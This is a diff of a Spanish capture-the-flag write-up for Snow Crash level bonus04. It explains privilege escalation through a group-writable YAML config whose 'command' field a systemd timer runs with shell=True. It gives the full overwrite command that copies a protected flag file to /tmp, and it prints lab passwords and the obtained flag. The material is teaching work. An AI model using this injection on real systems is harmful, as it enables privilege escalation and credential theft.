@@ -1,194 +1,234 @@
-# Bonus04 - Snow Crash
+# Bonus04 — Snow Crash
 
-## Tipo de ejercicio
+> **Nivel bonus** · YAML + timer · `shell=True` · Config escribible por grupo
+
+| | |
+|---|---|
+| **Proyecto** | Snow Crash (42) |
+| **Nivel** | `bonus04` |
+| **Usuario de entrada** | `bonus04` |
+| **Objetivo** | Credencial de `flagbonus04` |
+| **Idea central** | Reescribir `services.executor.command` en el YAML |
+
+---
+
+<a id="indice"></a>
+
+## 📋 Índice
+
+1. 🧭 [¿De qué va este nivel? (visión general)](#sec-1)
+2. 🗺️ [Mapa mental del ataque](#sec-2)
+3. 📖 [Glosario rápido](#sec-3)
+4. 🏷️ [Tipo de ejercicio](#sec-4)
+5. 🎯 [Objetivo](#sec-5)
+6. 🔑 [Acceso al nivel](#sec-6)
+7. 🔍 [Localizar el componente del nivel](#sec-7)
+8. ⏱️ [Servicio y timer systemd](#sec-8)
+9. 📄 [Lógica relevante de juanita.py](#sec-9)
+10. 🔐 [Permisos de la configuración](#sec-10)
+11. ✅ [Explotación](#sec-11)
+12. 🏁 [Credencial final](#sec-12)
+13. ⌨️ [Resumen de comandos válidos](#sec-13)
+14. 💡 [Conceptos importantes](#sec-14)
+15. 📦 [Conclusión](#sec-15)
+16. 📁 [Estructura recomendada en el repositorio](#sec-16)
+17. 📚 [Para seguir aprendiendo](#sec-17)
+18. 🩹 [Errores frecuentes y qué significan](#sec-err)
+
+> **Tip de navegación:** al final de cada sección encontrarás un enlace **↑ Volver al índice**.
+
+---
+
+<a id="sec-1"></a>
+
+## 1. 🧭 ¿De qué va este nivel? (visión general)
+
+Cada minuto un temporizador despierta a **Juanita** (`juanita.py` como
+`flagbonus04`). Juanita lee un **manual de instrucciones**
+(`/etc/juanita/config.yaml`). Tú no puedes crear ficheros nuevos en esa
+carpeta, pero **sí puedes reescribir el manual** (grupo `juanita_grp`).
+
+En el manual hay una línea `command:` que se ejecuta con `shell=True`. Si pones
+ahí un `cp` del `.flag` a `/tmp`, en el siguiente ciclo tienes la flag.
+
+Analogía: no eres el chef, pero puedes cambiar la receta del libro que el chef
+sigue cada hora.
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-2"></a>
+
+## 2. 🗺️ Mapa mental del ataque
+
+```text
+  juanita.timer  (OnUnitActiveSec=60s)
+        │
+        ▼
+  juanita.service (oneshot, User=flagbonus04)
+        │  python3 /opt/snowcrash/bonus04/juanita.py
+        │
+        │  yaml.safe_load(/etc/juanita/config.yaml)
+        │  valida metadata, services, defaults
+        │  subprocess.run(command, shell=True)
+        ▼
+  command = cp .../.flag /tmp/juanita_flag
+        │
+        ▼
+  [bonus04] cat /tmp/juanita_flag
+```
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-3"></a>
+
+## 3. 📖 Glosario rápido
+
+| Término | Analogía cotidiana | Qué es en la práctica |
+|---------|-------------------|------------------------|
+| **systemd timer** | Despertador periódico | Dispara un servicio cada N segundos |
+| **oneshot** | Tarea que arranca, termina y listo | Tipo de servicio sin daemon permanente |
+| **`yaml.safe_load`** | Leer receta sin trucos de objetos mágicos | Sin RCE por deserialización; el peligro es `command` |
+| **`shell=True`** | Pasar la frase al intérprete de comandos | Equivale a `/bin/sh -c "..."` |
+| **Grupo escribible en un fichero** | Puedes editar el libro, no la estantería | `-rw-rw-r--` root:`juanita_grp` |
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-4"></a>
+
+## 4. 🏷️ Tipo de ejercicio
 
 Inyección de comando mediante un fichero de configuración **YAML escribible por
 grupo**, consumido periódicamente por un servicio `systemd` (`oneshot` + timer)
 que ejecuta el campo `command` con `subprocess.run(..., shell=True)` como
 usuario privilegiado.
 
-## Objetivo
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
-Obtener la credencial asociada a `flagbonus04` / al siguiente nivel bonus.
+---
 
-El script `/opt/snowcrash/bonus04/juanita.py` es legible por todos. El timer
-`juanita.timer` lo lanza cada ~60 segundos como `flagbonus04`. La configuración
-`/etc/juanita/config.yaml` es modificable por el grupo `juanita_grp`, al que
-pertenece `bonus04`.
+<a id="sec-5"></a>
 
-La pista del home de `bonus04` es:
+## 5. 🎯 Objetivo
+
+Obtener la credencial de `flagbonus04`.
 
 ```text
 Juanita understood things others didn't bother to read.
 ```
 
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 1. Acceso al nivel
+<a id="sec-6"></a>
 
-Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
-subject oficial usa `4242`):
+## 6. 🔑 Acceso al nivel
 
 ```bash
 ssh bonus04@localhost -p 2424
+# password: mof3b3iud5c3p35bsv9aua0bj
+whoami; id; cat README
 ```
 
-La contraseña de `bonus04` es la flag de `bonus03`:
+Debes ver **`juanita_grp`**.
 
-```text
-mof3b3iud5c3p35bsv9aua0bj
-```
-
-Comprobar identidad y entorno:
-
-```bash
-whoami
-id
-pwd
-ls -la
-cat README
-```
-
-Resultado esperado:
-
-```text
-bonus04
-uid=3004(bonus04) gid=3004(bonus04) groups=3004(bonus04),1001(levelgroup),4011(juanita_grp)
-/home/bonus04
-```
-
-```text
-Juanita understood things others didn't bother to read.
-```
-
-Detalle importante del `id`: el usuario pertenece al grupo **`juanita_grp`**
-(`4011`). Ese grupo tiene permiso de **escritura** sobre el YAML de
-configuración.
-
-La cuenta `flagbonus04` existe con shell nologin (no se usa login interactivo
-con ese usuario; la flag se obtiene a través del servicio).
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 2. Localizar el componente del nivel
+<a id="sec-7"></a>
+
+## 7. 🔍 Localizar el componente del nivel
 
 ```bash
 ls -laR /opt/snowcrash/bonus04
 ```
 
-Resultado:
-
 ```text
-/opt/snowcrash/bonus04:
 -rwxr-xr-x  1 root root 7606 ... juanita.py
 ```
 
-El script es **legible y ejecutable** por cualquier usuario. Conviene leerlo
-entero:
+El script es **legible** por todos:
 
 ```bash
 cat /opt/snowcrash/bonus04/juanita.py
 ```
 
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 3. Servicio y timer systemd
+<a id="sec-8"></a>
+
+## 8. ⏱️ Servicio y timer systemd
 
 ```bash
 systemctl cat juanita.service
 systemctl cat juanita.timer
 systemctl list-timers --all | grep -i juanita
-systemctl status juanita.timer --no-pager
 ```
 
-### `juanita.service`
+**Service:** `Type=oneshot`, `User=flagbonus04`,
+`ExecStart=/usr/bin/python3 /opt/snowcrash/bonus04/juanita.py`.
 
-```ini
-[Unit]
-Description=Snow Crash bonus04 — Juanita YAML executor service
-After=network.target
+**Timer:** `OnBootSec=10s`, `OnUnitActiveSec=60s` → cada ~**60 segundos**.
 
-[Service]
-Type=oneshot
-User=flagbonus04
-Group=flagbonus04
-ExecStart=/usr/bin/python3 /opt/snowcrash/bonus04/juanita.py
-StandardOutput=journal
-StandardError=journal
-```
-
-### `juanita.timer`
-
-```ini
-[Unit]
-Description=Snow Crash bonus04 — Juanita YAML executor timer (every 60 s)
-
-[Timer]
-OnBootSec=10s
-OnUnitActiveSec=60s
-Unit=juanita.service
-
-[Install]
-WantedBy=timers.target
-```
-
-Implicaciones:
-
-- Cada ~**60 segundos** se ejecuta `juanita.py` como **`flagbonus04`**.
-- Tipo `oneshot`: arranca, termina y vuelve a esperar al siguiente disparo del
-  timer.
-- No hace falta (ni suele ser posible) lanzar el servicio a mano sin privilegios
-  de administración; basta con esperar al timer.
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 4. Lógica relevante de `juanita.py`
+<a id="sec-9"></a>
+
+## 9. 📄 Lógica relevante de juanita.py
 
 Constantes:
 
 ```python
 CONFIG_PATH = "/etc/juanita/config.yaml"
-LOG_PATH    = "/var/log/juanita/juanita.log"
-PID_FILE    = "/var/run/juanita.pid"
 ```
 
-Carga de configuración:
+Carga:
 
 ```python
-with open(config_path, "r", encoding="utf-8") as fh:
-    cfg = yaml.safe_load(fh)
+cfg = yaml.safe_load(fh)   # no es unsafe_load
 ```
 
-Se usa **`yaml.safe_load`**: no hay RCE por deserialización de objetos YAML
-arbitrarios. El vector no es “YAML unsafe”, sino el **contenido del campo
-`command`**.
-
-Validación mínima (`_validate_config`):
-
-- Deben existir las claves de primer nivel: `metadata`, `services`, `defaults`.
-- Debe existir `services.executor`.
-- `services.executor` debe ser un diccionario con clave **`command`**.
+Validación: exige `metadata`, `services`, `defaults` y
+`services.executor.command` no vacío.
 
 Ejecución:
 
 ```python
 command = executor_cfg["command"]
-...
-result = subprocess.run(
-    command,
-    shell=True,
-    timeout=timeout,
-    capture_output=True,
-    text=True,
-)
+subprocess.run(command, shell=True, timeout=timeout, capture_output=True, text=True)
 ```
 
-`shell=True` implica que el string de `command` se interpreta por un shell.
-Cualquier comando válido en ese string se ejecuta **como `flagbonus04`**.
+`safe_load` evita objetos arbitrarios de PyYAML, pero **no** mitiga un campo
+`command` que luego se pasa a `shell=True`.
+
+**Analogía ampliada:** `yaml.safe_load` es como un lector de menús que **no**
+acepta “trucos de magia” en el papel (no ejecuta código oculto en el YAML).
+Pero si en el menú hay una casilla que dice “comando del día” y el cocinero
+copia esa casilla tal cual a la cocina (`shell=True`), da igual lo “seguro”
+que sea el lector del menú: lo peligroso es **quién rellena la casilla** y
+**quién la ejecuta**.
+
+En este nivel tú rellenas la casilla y Juanita (como `flagbonus04`) la ejecuta.
+
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 5. Permisos de la configuración
+<a id="sec-10"></a>
+
+## 10. 🔐 Permisos de la configuración
 
 ```bash
 ls -la /etc/juanita/
@@ -196,38 +236,27 @@ ls -la /etc/juanita/config.yaml
 ```
 
 ```text
-drwxr-xr-x  2 root juanita_grp 4096 ... .
--rw-rw-r--  1 root juanita_grp 3722 ... config.yaml
+drwxr-xr-x  2 root juanita_grp ... .
+-rw-rw-r--  1 root juanita_grp ... config.yaml
 ```
 
-| Ruta | Permisos | Efecto para `bonus04` |
-|------|----------|------------------------|
-| `/etc/juanita/` | `drwxr-xr-x` root:`juanita_grp` | Listar/entrar; **no** crear ficheros nuevos |
-| `/etc/juanita/config.yaml` | `-rw-rw-r--` root:`juanita_grp` | **Leer y modificar** el YAML |
+| Ruta | Efecto para `bonus04` |
+|------|------------------------|
+| Directorio | Listar/entrar; **no** crear ficheros nuevos |
+| `config.yaml` | **Leer y modificar** |
 
-Comprobación:
+El YAML original es largo; solo importan las claves del validador y
+`services.executor.command` (por defecto `"/bin/true"`).
 
-```bash
-touch /etc/juanita/test_write
-# touch: cannot touch '...': Permission denied
-
-# Sí se puede sobrescribir el fichero existente:
-# cat > /etc/juanita/config.yaml << 'EOF' ...
-```
-
-El YAML original incluye mucho ruido operativo (`network`, `storage`,
-`alerting`, etc.). Solo importan las secciones que exige el validador y el
-campo `services.executor.command` (por defecto `"/bin/true"`).
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 6. Explotación
+<a id="sec-11"></a>
 
-Sustituir la configuración por una mínima válida cuyo `command` copie el
-`.flag` a un sitio legible:
+## 11. ✅ Explotación
 
 ```bash
-# Copia de seguridad opcional
 cp /etc/juanita/config.yaml /tmp/config.yaml.bak
 
 cat > /etc/juanita/config.yaml << 'EOF'
@@ -245,146 +274,137 @@ services:
     label: getflag
 EOF
 
-cat /etc/juanita/config.yaml
-```
-
-Esperar al timer (hasta ~60–70 s):
-
-```bash
+# Esperar al timer (hasta ~60-70 s)
 for i in $(seq 1 15); do
-  if [ -f /tmp/juanita_flag ]; then
-    echo "FOUND"
-    cat /tmp/juanita_flag
-    break
-  fi
+  if [ -f /tmp/juanita_flag ]; then cat /tmp/juanita_flag; break; fi
   sleep 5
-  echo "  tick $i"
 done
-ls -la /tmp/juanita_flag
-cat /tmp/juanita_flag
 ```
-
-Salida obtenida:
 
 ```text
-FOUND
-oo0eoaiia5ei8oo9xasah2ihu
--rw-r--r-- 1 flagbonus04 flagbonus04 26 ... /tmp/juanita_flag
 oo0eoaiia5ei8oo9xasah2ihu
 ```
 
-### Secuencia
-
-1. `bonus04` sobrescribe `/etc/juanita/config.yaml` (permiso de grupo).
-2. `juanita.timer` dispara `juanita.service`.
-3. `juanita.py` corre como `flagbonus04`, hace `safe_load` del YAML y valida el
-   esquema.
-4. Ejecuta `command` con `shell=True`.
-5. Aparece `/tmp/juanita_flag` con la credencial.
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 7. Credencial final
+<a id="sec-12"></a>
+
+## 12. 🏁 Credencial final
 
 ```text
 oo0eoaiia5ei8oo9xasah2ihu
 ```
 
-Guardar en el repositorio:
+→ `bonus04/flag` y contraseña de `bonus05`.
 
-```text
-bonus04/flag
-```
-
-con una sola línea con esa cadena.
-
-Ese valor se usa como contraseña SSH del siguiente nivel bonus (`bonus05`):
-
-```bash
-ssh bonus05@localhost -p 2424
-# password: oo0eoaiia5ei8oo9xasah2ihu
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 8. Resumen de comandos válidos
+<a id="sec-13"></a>
+
+## 13. ⌨️ Resumen de comandos válidos
 
 ```bash
-ssh bonus04@localhost -p 2424
-ls -la
-cat README
 cat /opt/snowcrash/bonus04/juanita.py
-systemctl cat juanita.service
 systemctl cat juanita.timer
 ls -la /etc/juanita/config.yaml
-
-cp /etc/juanita/config.yaml /tmp/config.yaml.bak
-cat > /etc/juanita/config.yaml << 'EOF'
-metadata:
-  service_name: juanita
-  version: "3.1.0"
-defaults:
-  retry_policy:
-    retry_count: 1
-    backoff_secs: 0
-services:
-  executor:
-    command: "cp /home/flagbonus04/.flag /tmp/juanita_flag && chmod 644 /tmp/juanita_flag"
-    timeout_secs: 30
-    label: getflag
-EOF
-
-# Esperar ~60 s al timer
+# sobrescribir command + esperar timer
 cat /tmp/juanita_flag
 ```
 
----
-
-## 9. Conceptos importantes
-
-- **`systemd` timer + oneshot**: ejecución periódica sin daemon permanente; el
-  usuario no necesita `systemctl start` si el timer está activo.
-- **`yaml.safe_load`**: evita objetos arbitrarios de PyYAML, pero **no** mitiga
-  un campo de configuración que luego se pasa a `shell=True`.
-- **`subprocess.run(..., shell=True)`**: el string completo se interpreta por
-  `/bin/sh` (o equivalente); es equivalente a dejar un “script” configurable
-  por quien pueda editar el YAML.
-- **Permisos de grupo en un fichero de config**: un directorio no escribible
-  puede seguir siendo explotable si un fichero concreto dentro sí lo es
-  (`-rw-rw-r--` con grupo del atacante).
-- **Validación de esquema incompleta**: exigir claves y un `command` no vacío
-  no implica una lista blanca de comandos seguros.
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 10. Conclusión
+<a id="sec-14"></a>
 
-No se necesita deserialización insegura ni modificar el binario del servicio.
-La solución consiste en:
+## 14. 💡 Conceptos importantes
 
-1. Leer `juanita.py` y localizar `CONFIG_PATH` y `shell=True`.
-2. Comprobar que `/etc/juanita/config.yaml` es escribible por `juanita_grp`.
-3. Escribir un YAML mínimo válido cuyo `services.executor.command` copie
-   `/home/flagbonus04/.flag` a `/tmp/juanita_flag`.
-4. Esperar al timer y leer el fichero de salida.
+- Timers de systemd + oneshot
+- `yaml.safe_load` no implica lista blanca de comandos
+- `subprocess.run(..., shell=True)` como vector de inyección
+- Fichero de config escribible por grupo aunque el directorio no lo sea
 
-Credencial obtenida:
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-15"></a>
+
+## 15. 📦 Conclusión
+
+Cambiar la receta que Juanita ejecuta cada minuto. Credencial:
 
 ```text
 oo0eoaiia5ei8oo9xasah2ihu
 ```
 
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 11. Estructura recomendada en el repositorio
+<a id="sec-16"></a>
+
+## 16. 📁 Estructura recomendada en el repositorio
 
 ```text
 bonus04/
-├── flag                          # oo0eoaiia5ei8oo9xasah2ihu
+├── flag
 └── resources/
-    └── bonus04.md                # este documento
+    └── bonus04.md
 ```
 
-Según la convención del repo `42_snow-crash`, la guía detallada vive en
-`bonus04/resources/bonus04.md` y el token en `bonus04/flag`.
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-17"></a>
+
+## 17. 📚 Para seguir aprendiendo
+
+| Tema | Pista |
+|------|--------|
+| Timers | `man systemd.timer` |
+| subprocess | riesgos de `shell=True` |
+| Hardening | configs de solo lectura, allowlists |
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+
+---
+
+<a id="sec-err"></a>
+
+## 18. 🩹 Errores frecuentes y qué significan
+
+Cuando algo “no funciona”, casi siempre el mensaje del sistema apunta a una
+causa concreta. Esta tabla resume los síntomas más habituales de **bonus04**,
+qué suelen querer decir y el siguiente comando o acción razonable.
+
+| Síntoma | Causa probable | Qué hacer |
+|---------|----------------|-----------|
+| `touch /etc/juanita/x`: Permission denied | El **directorio** no es escribible | Normal. Sobrescribe **`config.yaml`**, no crees ficheros nuevos. |
+| No aparece `/tmp/juanita_flag` | El timer aún no ha disparado | Espera ~60 s; comprueba `systemctl list-timers \| grep juanita`. |
+| YAML escrito pero no ejecuta el comando | Falta clave del validador | Debe haber `metadata`, `services`, `defaults` y `services.executor.command`. |
+| `systemctl start juanita.service` falla | Sin privilegios de administración | No hace falta: el **timer** ya lo lanza solo. |
+| El comando corre pero no hay flag | Ruta del `.flag` o permisos de `/tmp` | Usa `cp ... && chmod 644 /tmp/juanita_flag`. |
+| ¿Es un RCE por YAML inseguro? | No: usa `safe_load` | El vector es **`shell=True`** sobre el campo `command`. |
+
+**Cómo usarla:** localiza la fila que más se parezca a lo que ves en pantalla,
+aplica la acción sugerida y, si el síntoma cambia, vuelve a consultar la tabla
+(a menudo un error se resuelve y aparece el siguiente de la lista).
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<div align="center">
+
+**42 Málaga** — **rdel-olm & sternero** — **Octubre 2026**
+
+*Snow Crash · bonus04 · material didáctico de resolución*
+
+</div>
